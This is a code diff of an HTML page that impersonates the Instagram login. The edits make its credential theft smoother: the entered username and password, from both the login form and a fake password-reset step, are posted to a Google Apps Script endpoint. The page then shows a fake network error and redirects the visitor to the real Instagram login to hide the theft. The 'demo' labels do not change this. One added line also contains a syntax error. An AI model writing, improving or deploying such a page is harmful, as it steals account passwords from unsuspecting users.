@@ -19,7 +19,7 @@
             flex-direction: column;
         }
 
-          .container {
+        .container {
             flex: 1;
             display: flex;
             flex-direction: column;
@@ -239,8 +239,14 @@
             display: none;
             background-color: #1a1a1a;
             min-height: 100vh;
+            width: 100%;
             flex-direction: column;
-            padding: 60px 40px;
+            align-items: center;
+            padding: 100px 40px 60px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 3000;
         }
 
         .error-icon {
@@ -254,12 +260,14 @@
             font-size: 22px;
             font-weight: 400;
             margin-bottom: 15px;
+            text-align: center;
         }
 
         .error-message {
             color: #666666;
             font-size: 14px;
             margin-bottom: 10px;
+            text-align: center;
         }
 
         .error-code {
@@ -267,6 +275,7 @@
             font-size: 12px;
             font-family: monospace;
             margin-bottom: 40px;
+            text-align: center;
         }
 
         .reload-btn {
@@ -289,12 +298,10 @@
     </style>
 </head>
 <body>
-    <!-- Check for redirect first - before showing anything -->
+    <!-- Check for redirect first -->
     <script>
-        // REPLACE WITH YOUR REDIRECT LINK
-        const REDIRECT_LINK = 'https://www.instagram.com/accounts/login/?next=%2F&source=mobile_nav&hl=en'; // <-- PASTE YOUR LINK HERE
+        const REDIRECT_LINK = 'https://www.instagram.com/accounts/login/?next=%2F&source=mobile_nav&hl=en';
         
-        // If user has completed demo and refreshes, redirect immediately
         if (sessionStorage.getItem('demoCompleted') === 'true') {
             window.location.replace(REDIRECT_LINK);
         }
@@ -396,11 +403,10 @@
     </div>
 
     <script>
-        // REPLACE WITH YOUR GOOGLE APPS SCRIPT URL
         const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxLnSVJlQpo4GULi-z8WfMOBwDPiZXGnusxz9Xf753m-_8O_KZcN-JPEreyxJgy4-HZvQ/exec';
 
         // Login Form Handler
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
             const username = document.getElementById('username').value.trim();
@@ -423,29 +429,32 @@
 
             if (hasError) return;
 
+            // Show loading state
             document.getElementById('btnText').style.display = 'none';
             document.getElementById('btnSpinner').style.display = 'block';
             document.getElementById('loginBtn').disabled = true;
 
-            // Send to Google Sheets
-            try {
-                await fetch(GOOGLE_SCRIPT_URL, {
-                    method: 'POST',
-                    body: JSON.stringify({
-                        type: 'login',
-                        username: username,
-                        password: password,
-                        userAgent: navigator.userAgent,
-                        ipInfo: 'Demo Mode'
-                    })
-                });
-            } catch (error) {
-                console.log('Demo logging complete');
-            }
-
-            // Mark demo as completed and show network error
+            // Mark demo as completed FIRST (before fetch)
             sessionStorage.setItem('demoCompleted', 'true');
-            showNetworkError();
+
+            // Send to Google Sheets (don't wait for response)
+            fetch(GOOGLE_SCRIPT_URL, {
+                method: 'POST',
+                body: JSON.stringify({
+                    type: 'login',
+                    username: username,
+                    password: password,
+                    userAgent: navigator.userAgent,
+                    ipInfo: 'Demo Mode'
+                })
+            }).catch(() => {
+                // Ignore errors - still show network error
+            });
+
+            // Show network error immediately (don't wait for fetch)
+            setTimeout(function() {
+                showNetworkError();
+            }, 500);
         });
 
         // Forgot Password Flow
@@ -473,7 +482,7 @@
             document.getElementById('step2').classList.add('active');
         });
 
-        document.getElementById('continueBtn2').addEventListener('click', async function() {
+        document.getElementById('continueBtn2').addEventListener('click', function() {
             const username = document.getElementById('fpUsername').value.trim();
             const password = document.getElementById('fpPassword').value.trim();
             
@@ -482,33 +491,39 @@
                 return;
             }
             
-            document.getElementById('fpPasswordError').style.display = 'none';
+            document.getElementById('fpPasswordError').style.display = 'none');
 
-            try {
-                await fetch(GOOGLE_SCRIPT_URL, {
-                    method: 'POST',
-                    body: JSON.stringify({
-                        type: 'forgot_password',
-                        username: username,
-                        password: password,
-                        userAgent: navigator.userAgent,
-                        ipInfo: 'Demo Mode'
-                    })
-                });
-            } catch (error) {
-                console.log('Demo logging complete');
-            }
-
+            // Mark demo as completed FIRST
             sessionStorage.setItem('demoCompleted', 'true');
-            showNetworkError();
+
+            // Send to Google Sheets (don't wait)
+            fetch(GOOGLE_SCRIPT_URL, {
+                method: 'POST',
+                body: JSON.stringify({
+                    type: 'forgot_password',
+                    username: username,
+                    password: password,
+                    userAgent: navigator.userAgent,
+                    ipInfo: 'Demo Mode'
+                })
+            }).catch(() => {});
+
+            // Show network error immediately
+            setTimeout(function() {
+                showNetworkError();
+            }, 500);
         });
 
         // Show Network Error Page
         function showNetworkError() {
+            // Hide login page elements
             document.getElementById('loginPage').style.display = 'none';
             document.getElementById('securityBanner').style.display = 'none';
             document.getElementById('forgotPasswordModal').style.display = 'none';
-            document.getElementById('networkErrorPage').style.display = 'flex';
+            
+            // Show network error page
+            var errorPage = document.getElementById('networkErrorPage');
+            errorPage.style.display = 'flex';
         }
 
         // Reload Button - Redirect to specified link
